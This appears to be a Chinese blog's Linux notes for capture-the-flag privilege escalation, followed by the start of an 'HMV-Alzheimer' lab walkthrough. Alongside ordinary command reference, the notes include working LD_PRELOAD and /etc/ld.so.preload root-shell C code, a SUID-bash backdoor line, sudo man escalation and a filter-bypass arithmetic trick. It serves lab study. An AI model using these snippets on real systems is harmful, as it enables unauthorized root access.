<h2 id="逃逸"><a href="#逃逸" class="headerlink" title="/*逃逸"></a><code>/*逃逸</code></h2><p>用<code>/*</code>说明执行<code>/</code>后面的所有内容，那可以写<code>../../../</code>逃逸到有写入权限的目录。</p>
<h2 id="tee"><a href="#tee" class="headerlink" title="tee"></a>tee</h2><p><code>tee</code> 是一个在类 Unix 系统中常用的命令，它用于从标准输入读取数据，并将其同时输出到标准输出和一个或多个文件中。这对于在不丢失数据的情况下同时查看和保存输出非常有用。</p>
<h3 id="常见选项："><a href="#常见选项：" class="headerlink" title="常见选项："></a>常见选项：</h3><ul>
<li><code>-a</code>：追加到文件，而不是覆盖文件。</li>
<li><code>-i</code>：忽略中断信号。</li>
<li><code>-p</code>：在文件写入之前显示输出。</li>
</ul>
<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p><code>man</code>（manual）是 Linux 和 Unix 系统中的 <strong>手册（Manual）</strong> 命令，主要用于查看 <strong>命令、库函数、配置文件等的文档</strong>。<br>几乎所有 Linux 命令都有对应的 <code>man</code> 手册，格式 <strong>标准、结构清晰</strong>，是学习 Linux 的重要参考资料。<br><code>man</code> 手册分为 <strong>多个章节</strong>，不同章节的条目可能有相同的名称，但内容不同：</p>
<table>
<thead>
<tr>
<th><strong>章节</strong></th>
<th><strong>内容</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>1</strong></td>
<td>用户命令（常见命令，如 <code>ls</code>、<code>cd</code>、<code>grep</code>）</td>
</tr>
<tr>
<td><strong>2</strong></td>
<td>系统调用（如 <code>open()</code>、<code>read()</code>，需要 <code>#include</code>）</td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>库函数（如 <code>printf()</code>、<code>malloc()</code>，需要 <code>#include</code>）</td>
</tr>
<tr>
<td><strong>4</strong></td>
<td>设备文件（如 <code>/dev/null</code>）</td>
</tr>
<tr>
<td><strong>5</strong></td>
<td>配置文件格式（如 <code>/etc/passwd</code>）</td>
</tr>
<tr>
<td><strong>6</strong></td>
<td>游戏和娱乐</td>
</tr>
<tr>
<td><strong>7</strong></td>
<td>杂项（如 <code>man 7 regex</code> 解释正则表达式）</td>
</tr>
<tr>
<td><strong>8</strong></td>
<td>管理员命令（如 <code>iptables</code>，需要 root 权限）</td>
</tr>
</tbody></table>
<h2 id="man-命令的常用选项"><a href="#man-命令的常用选项" class="headerlink" title="man 命令的常用选项"></a><strong><code>man</code> 命令的常用选项</strong></h2><table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>-f</code></td>
<td>查找命令属于哪个 <code>man</code> 章节（等同于 <code>whatis</code>）</td>
</tr>
<tr>
<td><code>-k</code></td>
<td>关键字搜索手册（等同于 <code>apropos</code>）</td>
</tr>
<tr>
<td><code>-P &lt;pager&gt;</code></td>
<td>指定分页器（默认 <code>less</code>）</td>
</tr>
<tr>
<td><code>-a</code></td>
<td>显示所有匹配的手册</td>
</tr>
<tr>
<td><code>-l &lt;file&gt;</code></td>
<td>读取本地 <code>man</code> 手册</td>
</tr>
<tr>
<td><code>-w</code></td>
<td>仅显示手册路径，不打开</td>
</tr>
<tr>
<td>在有的题目中如果用man提权无法直接打开，要指定分页器</td>
<td></td>
</tr>
</tbody></table>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment">#报错信息</span></span><br><span class="line">Your terminal lacks <span class="keyword">the</span> ability <span class="built_in">to</span> <span class="built_in">clear</span> <span class="keyword">the</span> screen <span class="keyword">or</span> position <span class="keyword">the</span> cursor.</span><br><span class="line"></span><br><span class="line">sudo /bin/man -P /usr/bin/less man</span><br></pre></td></tr></table></figure></div>

<h2 id=""><a href="#" class="headerlink" title="$(())"></a>$(())</h2><p>这是shell中的计算符，里面跟上计算式 , 里面没有值就是0<br>~是取反，值等于+1再相反，比如-37的反就是36 , 有的题目过滤了数字，但是要拼出一个数字就用这种方法<br>比如</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="code"><pre><span class="line">awk <span class="keyword">BEGIN</span>&#123;<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">36</span>;i++)&#123;a=a<span class="string">&quot;<span class="variable">$</span>((~<span class="variable">$</span>(())))&quot;</span>&#125;print <span class="string">&quot;<span class="variable">$</span>((~(&quot;</span>a<span class="string">&quot;)))&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$</span>((~(<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(())))<span class="variable">$</span>((~<span class="variable">$</span>(()))))))</span><br><span class="line"></span><br><span class="line"><span class="number">36</span></span><br></pre></td></tr></table></figure></div>

<h2 id="usr-lib"><a href="#usr-lib" class="headerlink" title="&#x2F;usr&#x2F;lib"></a>&#x2F;usr&#x2F;lib</h2><p>在 Linux 系统中，<code>/usr/lib</code> 目录通常用于存放 <strong>系统和用户程序的库文件</strong>（shared libraries）</p>
<h3 id="1-共享库（Shared-Libraries）"><a href="#1-共享库（Shared-Libraries）" class="headerlink" title="1. 共享库（Shared Libraries）"></a><strong>1. 共享库（Shared Libraries）</strong></h3><ul>
<li>例如：<code>libc.so</code>（C 标准库）、<code>libssl.so</code>（OpenSSL 加密库）等</li>
</ul>
<h3 id="2-依赖库（Dependency-Libraries）"><a href="#2-依赖库（Dependency-Libraries）" class="headerlink" title="2. 依赖库（Dependency Libraries）"></a><strong>2. 依赖库（Dependency Libraries）</strong></h3><ul>
<li>存放各种软件的依赖库，例如 Python、Perl、Node.js、Qt、GTK 相关的库</li>
<li>例如：<ul>
<li><code>/usr/lib/python3.9/</code> → Python 3.9 相关的库</li>
<li><code>/usr/lib/node_modules/</code> → Node.js 全局安装的模块</li>
</ul>
</li>
</ul>
<h3 id="3-插件（Plugins）"><a href="#3-插件（Plugins）" class="headerlink" title="3. 插件（Plugins）"></a><strong>3. 插件（Plugins）</strong></h3><ul>
<li>某些软件的插件或模块也会放在 <code>/usr/lib</code></li>
<li>例如：<ul>
<li><code>/usr/lib/firefox/</code> → Firefox 的插件</li>
<li><code>/usr/lib/vim/</code> → Vim 相关插件</li>
</ul>
</li>
</ul>
<h3 id="4-32-位与-64-位库"><a href="#4-32-位与-64-位库" class="headerlink" title="4. 32 位与 64 位库"></a><strong>4. 32 位与 64 位库</strong></h3><ul>
<li>在 64 位系统中：<ul>
<li><code>/usr/lib/</code> 可能用于 32 位库（某些系统）</li>
<li><code>/usr/lib64/</code> 存放 64 位库</li>
</ul>
</li>
</ul>
<p>所以找python的一些库的函数就到&#x2F;usr&#x2F;lib&#x2F;pythonx中找</p>
<h2 id="lynx"><a href="#lynx" class="headerlink" title="lynx"></a>lynx</h2><p><code>lynx</code> 是 Linux 下的一款基于终端的文本模式 Web 浏览器，它允许用户在没有图形界面的环境下访问网页。由于 <code>lynx</code> 只显示纯文本，它在服务器环境、远程管理（如 SSH）、无 GUI 的系统以及需要快速访问网页时非常有用。<br>而且还有file:&#x2F;&#x2F; http:&#x2F;&#x2F; ftp:&#x2F;&#x2F; 等协议 可以查看本地文件</p>
<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>是 Linux 系统中的一个环境变量，用于在程序运行时动态加载指定的共享库。LD_PRELOAD 的作用是在程序运行前，将指定的共享库加载到程序的内存中。这样，程序在运行时会优先使用该共享库中的符号，而不是系统默认的符号。LD_PRELOAD 可以用于替换程序本身的函数，增加程序的功能或者调试程序。</p>
<p>LD_PRELOAD 的工作原理是，当程序需要调用某个符号时，系统会先在程序自身的符号表中查找，如果找不到，则会在 LD_PRELOAD 指定的共享库中查找。如果在 LD_PRELOAD 指定的共享库中找到了该符号，则使用该符号中的代码。</p>
<p>使用 LD_PRELOAD 可以实现一些特殊的功能，例如：</p>
<p>动态库劫持：可以用 LD_PRELOAD 来劫持程序中的函数，替换为自己编写的函数，实现一些特殊的功能。</p>
<p>程序调试：可以用 LD_PRELOAD 来替换程序中的函数，增加一些调试信息，例如，在程序中调用 printf 函数时，可以用 LD_PRELOAD 来替换为自己编写的函数，输出调试信息。</p>
<p>库版本控制：可以用 LD_PRELOAD 来强制程序使用指定版本的共享库，以避免程序在不同版本的环境中产生兼容性问题。<br>两种利用代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span> </span>&#123;   <span class="comment">//需要搜索查看函数的原型</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">before</span><span class="params">(<span class="type">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">before</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">gcc -<span class="keyword">shared</span> -fPIC hacker.c -o hacker.so</span><br></pre></td></tr></table></figure></div>
<p> LD_PRELOAD 也能解析 jpg 后缀</p>
<h2 id="etc-ld-so-preload"><a href="#etc-ld-so-preload" class="headerlink" title="/etc/ld.so.preload"></a><code>/etc/ld.so.preload</code></h2><p> <br>该文件是 Linux 系统的全局配置文件，用于指定程序启动时<strong>强制优先加载的动态链接库（.so 文件）</strong>。与 <code>LD_PRELOAD</code> 环境变量不同，<code>/etc/ld.so.preload</code> 的影响是<strong>系统级的</strong>，会对所有用户和进程生效<br>该文件的行为类似于**<code>LD_PRELOAD</code>** ENV 变量，但也适用于 <strong>SUID 二进制文件</strong>。<br>如果您可以创建它或修改它，则只需在每个执行的二进制文件中<strong>加载的库中添加路径</strong>即可。</p>
<p>例如： <code>echo &quot;/tmp/pe.so&quot; &gt; /etc/ld.so.preload</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    <span class="built_in">unlink</span>(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="comment">//后门写法-只用一次 system(&quot;cp /bin/bash /tmp/sh ; chmod +s /tmp/sh; rm /etc/ld.so.preload&quot;)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cd /tmp</span></span><br><span class="line"><span class="comment">//gcc -fPIC -shared -o pe.so pe.c -nostartfiles</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>接触到这个是在flower靶机里面，touch有suid，然后没有这个&#x2F;etc&#x2F;ld.so.preload文件，然后修改umask<br>用法就是在创建好这个&#x2F;etc&#x2F;ld.so.preload之后，在这个文件里面输入编译好的文件的位置，比如&#x2F;tmp&#x2F;a.so</p>
<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>Linux telnet 命令用于远端登入。</p>
<p>执行 telnet 指令开启终端机阶段作业，并登入远端主机。</p>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">telnet <span class="selector-attr">[选项]</span> &lt;目标IP或主机名&gt; <span class="selector-attr">[端口]</span></span><br></pre></td></tr></table></figure></div>

<p>Telnet 客户端命常用命令：<br>　　open : 使用 openhostname 可以建立到主机的 Telnet 连接。<br>　　close : 使用命令 close 命令可以关闭现有的 Telnet 连接。<br>　　display : 使用 display 命令可以查看 Telnet 客户端的当前设置。<br>　　send : 使用 send 命令可以向 Telnet 服务器发送命令。支持以下命令：<br>　　ao : 放弃输出命令。<br>　　ayt : “Are you there” 命令。<br>　　esc : 发送当前的转义字符。<br>　　ip : 中断进程命令。<br>　　synch : 执行 Telnet 同步操作。<br>　　brk : 发送信号。<br>在 <code>telnet</code> 会话中，使用 <code>Ctrl + ]</code> 进入 <code>telnet&gt;</code> 提示符，然后输入：</p>
<h2 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h2><p><code>strace</code> 是 Linux 系统中用于<strong>动态跟踪用户空间进程与内核交互</strong>的工具，主要监控进程的<strong>系统调用</strong>、<strong>信号传递</strong>和<strong>进程状态变更</strong>。其底层通过内核的 <code>ptrace</code> 特性实现，是运维和开发人员诊断程序问题的利器</p>
<h3 id="strace-跟踪流的输出内容"><a href="#strace-跟踪流的输出内容" class="headerlink" title="strace 跟踪流的输出内容"></a><strong><code>strace</code> 跟踪流的输出内容</strong></h3><p>当使用 <code>strace</code> 跟踪进程时，其输出主要包含以下信息</p>
<ol>
<li><strong>系统调用名称</strong>：如 <code>open</code>、<code>read</code>、<code>write</code>、<code>close</code>、<code>access</code> 等。</li>
<li><strong>调用参数</strong>：以符号或十六进制形式显示参数（如文件路径、标志位等）。<ul>
<li>示例：<code>open(&quot;/etc/ld.so.preload&quot;, O_RDONLY) = 3</code>，表示以只读方式打开该文件，返回文件描述符 3。</li>
</ul>
</li>
<li><strong>返回值</strong>：系统调用的结果状态。<ul>
<li>成功时返回具体值（如文件描述符、字节数）；</li>
<li>失败时返回 <code>-1</code> 并附带错误原因（如 <code>ENOENT</code> 表示文件不存在，<code>EACCES</code> 表示权限不足）。</li>
</ul>
</li>
<li><strong>耗时信息</strong>（若启用 <code>-T</code> 参数）：显示系统调用的执行时间。</li>
<li><strong>进程 &#x2F; 线程标识</strong>（若启用 <code>-f</code> 参数）：在多进程 &#x2F; 线程场景下显示具体 PID 或 TID。<ul>
<li>示例：<code>[pid 17654] open(&quot;test.log&quot;, O_WRONLY)</code>。</li>
</ul>
</li>
</ol>
<h3 id="grep-Pi-open-access-no-such-file-的过滤逻辑"><a href="#grep-Pi-open-access-no-such-file-的过滤逻辑" class="headerlink" title="grep -Pi &quot;open|access|no such file&quot; 的过滤逻辑"></a><strong><code>grep -Pi &quot;open|access|no such file&quot;</code> 的过滤逻辑</strong></h3><p>用户通过此命令筛选 <code>strace</code> 输出中的关键信息，原因如下：</p>
<ol>
<li><strong>目标系统调用过滤</strong>：<ul>
<li><strong><code>open</code></strong>：跟踪文件打开操作，常用于排查文件路径错误、权限问题或依赖缺失。</li>
<li><strong><code>access</code></strong>：检查文件是否存在或可访问，用于定位权限配置错误（如 <code>EACCES</code>）或路径不存在（<code>ENOENT</code>）</li>
</ul>
<p> </p>
</li>
<li><strong>错误关键字过滤</strong>：<ul>
<li><strong><code>no such file</code></strong>：匹配 <code>ENOENT</code> 错误，快速定位因文件 &#x2F; 目录不存在导致的失败。</li>
</ul>
</li>
<li><strong>参数解释</strong>：<ul>
<li><strong><code>-P</code></strong>：启用 Perl 兼容正则表达式（PCRE），支持更灵活的匹配语法。</li>
<li><strong><code>-i</code></strong>：忽略大小写，确保匹配 <code>No Such File</code> 或 <code>NO SUCH FILE</code> 等变体<br>这样子就是看调用了什么，第一次记录这个指令是在flower靶机中，touch有suid，然后追踪touch，发现没有&#x2F;etc&#x2F;ld.so.preload</li>
</ul>
</li>
</ol>
<h3 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a><strong>核心功能</strong></h3><ul>
<li><strong>跟踪系统调用</strong>：记录进程执行过程中调用的所有系统调用（如 <code>open</code>、<code>read</code>、<code>write</code> 等），包括参数、返回值和耗时。</li>
<li><strong>信号监控</strong>：捕获进程接收和发送的信号（如 <code>SIGKILL</code>）。</li>
<li><strong>黑盒分析</strong>：当程序无日志或日志不清晰时，通过系统调用定位问题根源。</li>
</ul>
<h2 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h2><p>Linux umask 命令指定在建立文件时预设的权限掩码。</p>
<p>umask 可用来设定 [权限掩码]。[权限掩码] 是由 3 个八进制的数字所组成，将现有的存取权限减掉权限掩码后，即可产生建立文件时预设的权限。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">umask: usage: umask <span class="comment">[-p]</span> <span class="comment">[-S]</span> <span class="comment">[mode]</span></span><br></pre></td></tr></table></figure>
<p>-p：打印当前 umask 值</p>
<p>-S：显示当前掩码</p>
<p>mode：设置为 umask 值<br>这个用在如果类似于touch这样创建文件的指令有suid的时候有用，因为普通的时候用户可以用chmod直接修改文件的权限，就没什么用<br>umask的权限修改方式和chmod是相反的，chmod是直接给权限，umask是用666减去权限，比如umask是022 那创建之后的权限就是644</p>
<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><p>bash除了直接获得一个bash还有一些关键字和参数</p>
<h3 id="Bash-脚本中的位置参数"><a href="#Bash-脚本中的位置参数" class="headerlink" title="Bash 脚本中的位置参数"></a><strong>Bash 脚本中的位置参数</strong></h3><p>脚本内通过 <code>$0</code>、<code>$1</code>、<code>$2</code> 等引用参数，特殊参数含义如下：</p>
<ol>
<li><strong><code>$0</code></strong>：脚本文件名（包含路径） </li>
<li><strong><code>$1</code>、<code>$2</code>、…</strong>：第 1、2 个参数，依次类推 </li>
<li><strong><code>$#</code></strong>：参数个数（不包含 <code>$0</code>） </li>
<li><strong><code>$@</code> 与 <code>$*</code></strong>：所有参数列表，区别在于 <code>&quot;$@&quot;</code> 为数组，<code>&quot;$*&quot;</code> 为单个字符串 </li>
<li><strong><code>$?</code></strong>：上一条命令的退出状态码（0 表示成功） </li>
<li><strong><code>$$</code></strong>：当前进程的 PID <br>示例</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/test.sh a b c # $0=./</span>test.sh, <span class="variable">$1</span>=a, <span class="variable">$2</span>=b, <span class="variable">$3</span>=c, <span class="variable">$#</span>=<span class="number">3</span></span><br></pre></td></tr></table></figure></div>

<h3 id="交互模式和脚本模式"><a href="#交互模式和脚本模式" class="headerlink" title="交互模式和脚本模式"></a><strong>交互模式和脚本模式</strong></h3><table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>-i</code></td>
<td><strong>交互模式</strong>（interactive mode），Bash 启动后会提供命令提示符。</td>
</tr>
<tr>
<td><code>-c &quot;command&quot;</code></td>
<td>运行<strong>单个命令</strong>后退出，如：<code>bash -c &#39;echo Hello&#39;</code></td>
</tr>
<tr>
<td><code>-s</code></td>
<td>让 Bash 从 <strong>标准输入</strong> 读取命令，如：&#96;echo ‘echo hello’</td>
</tr>
<tr>
<td><code>--rcfile file</code></td>
<td>指定 <strong>自定义启动文件</strong>（而不是 <code>~/.bashrc</code>）。</td>
</tr>
</tbody></table>
<h3 id="权限与安全"><a href="#权限与安全" class="headerlink" title="权限与安全"></a><strong>权限与安全</strong></h3><table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>-p</code></td>
<td><strong>保留特权模式</strong>（privileged mode），即不降低 SUID&#x2F;SGID 权限。</td>
</tr>
<tr>
<td><code>--noprofile</code></td>
<td><strong>不加载 <code>~/.bash_profile</code> 或 <code>/etc/profile</code></strong>（适用于非交互式 shell）。</td>
</tr>
<tr>
<td><code>--norc</code></td>
<td><strong>不加载 <code>~/.bashrc</code></strong>（适用于交互式 shell）。</td>
</tr>
<tr>
<td><code>--restricted</code> &#x2F; <code>-r</code></td>
<td><strong>受限模式</strong>（restricted mode），限制部分 Bash 功能（如 <code>cd</code>、环境变量修改等）。</td>
</tr>
<tr>
<td>所以通过某种方式得到了&#x2F;bin&#x2F;bash 并且已经chmod+s 之后就要用-p参数来用这个bash，保持这个bash原来的suid</td>
<td></td>
</tr>
</tbody></table>
<h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p><code>xxd</code> 是 Linux 下的十六进制转储工具，用于 <strong>将文件或数据转换为十六进制格式</strong> 或 <strong>反向还原为二进制</strong>，适用于调试、数据分析和二进制编辑等场景</p>
<h3 id="xxd-命令选项"><a href="#xxd-命令选项" class="headerlink" title="xxd 命令选项"></a><code>xxd</code> 命令选项</h3><table>
<thead>
<tr>
<th>选项</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>-a</code></td>
<td>缺省忽略转换：使用 <code>*</code> 替换空行。</td>
</tr>
<tr>
<td><code>-b</code></td>
<td>以二进制格式转储数据（与 <code>-ps</code>、<code>-i</code>、<code>-r</code> 不兼容），默认为十六进制。</td>
</tr>
<tr>
<td><code>-c cols</code></td>
<td>每行显示多少列的八位字节（默认 16 列，<code>-i</code> 选项默认 12 列，<code>-ps</code> 选项默认 30 列）。</td>
</tr>
<tr>
<td><code>-E</code></td>
<td>使用 EBCDIC 字符集（默认使用 ASCII 字符集）。</td>
</tr>
<tr>
<td><code>-e</code></td>
<td>以小端模式转储数据（与 <code>-ps</code>、<code>-i</code>、<code>-r</code> 不兼容）。</td>
</tr>
<tr>
<td><code>-g</code></td>
<td>在正常输出模式下，每组包含的八位字节数（默认 2 个，<code>-e</code> 选项时默认 4 个）。</td>
</tr>
<tr>
<td><code>-h</code></td>
<td>显示帮助信息。</td>
</tr>
<tr>
<td><code>-i</code></td>
<td>以 C 语言数组的格式输出数据。</td>
</tr>
<tr>
<td><code>-l len</code></td>
<td>在 <code>len</code> 个八位字节后停止转储。</td>
</tr>
<tr>
<td><code>-o off</code></td>
<td>从 <code>off</code> 偏移量开始转储数据。</td>
</tr>
<tr>
<td><code>-ps</code></td>
<td>以 <code>postscript</code> 格式输出，并在行尾添加十六进制转储内容。</td>
</tr>
<tr>
<td><code>-r</code></td>
<td>逆向操作：将十六进制内容转换（或修补）回二进制数据。</td>
</tr>
<tr>
<td><code>-r -s off</code></td>
<td>在 <code>off</code> 偏移量处开始将十六进制内容转换回二进制数据。</td>
</tr>
<tr>
<td><code>-s [+][-]seek</code></td>
<td>指定 <code>seek</code> 偏移量来开始读取输入文件（<code>+</code> 号表示相对偏移，<code>-</code> 号表示负偏移）。</td>
</tr>
<tr>
<td><code>-u</code></td>
<td>使用大写字母表示十六进制数据。</td>
</tr>
<tr>
<td><code>-v</code></td>
<td>显示 <code>xxd</code> 版本信息，如 <code>&quot;xxd V1.10 27oct98 by Juergen Weigert&quot;</code>。</td>
</tr>
<tr>
<td>-p -r 一般够用</td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>linux</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>linux</tag>
        <tag>操作系统</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Alzheimer</title>
    <url>/posts/16384.html</url>
    <content><![CDATA[<p>HMV-Alzheimer靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679a35f1d0e0a243d4f878cb.png"></p>
<h1 id="Alzheimer"><a href="#Alzheimer" class="headerlink" title="Alzheimer"></a>Alzheimer</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p> <img src="https://pic1.imgdb.cn/item/679a400bd0e0a243d4f87a4b.png"><br>三个端口  只有21端口现在是开放的  80和22都是有防火墙<br>先尝试能不能匿名登录ftp  然后上传反弹shell文件<br><img src="https://pic1.imgdb.cn/item/679a4010d0e0a243d4f87a4c.png"><br>发现有一个.secretnote.txt 下载到本地查看<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4d.png"><br>提示我们要用knock服务 按这个顺序发送请求包才能打开端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">┌──(root㉿kakeru)-[~/alz]</span></span><br><span class="line"><span class="string">└─#</span> <span class="string">knock</span> <span class="string">-u</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.125</span> <span class="number">1000 </span><span class="number">2000 </span><span class="number">3000</span></span><br></pre></td></tr></table></figure></div>
<p>但是敲门之后还是无法打开两个端口  查了wp  发现和橘墨大佬的问题一样 因为我修改过网卡，所以去修改靶机的knockd配置文件<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4e.png" alt="|500"><br><code>service knockd restart</code><br><img src="https://pic1.imgdb.cn/item/679a403ed0e0a243d4f87a59.png"><br>修改配置文件之后在knock就可以访问80端口了</p>
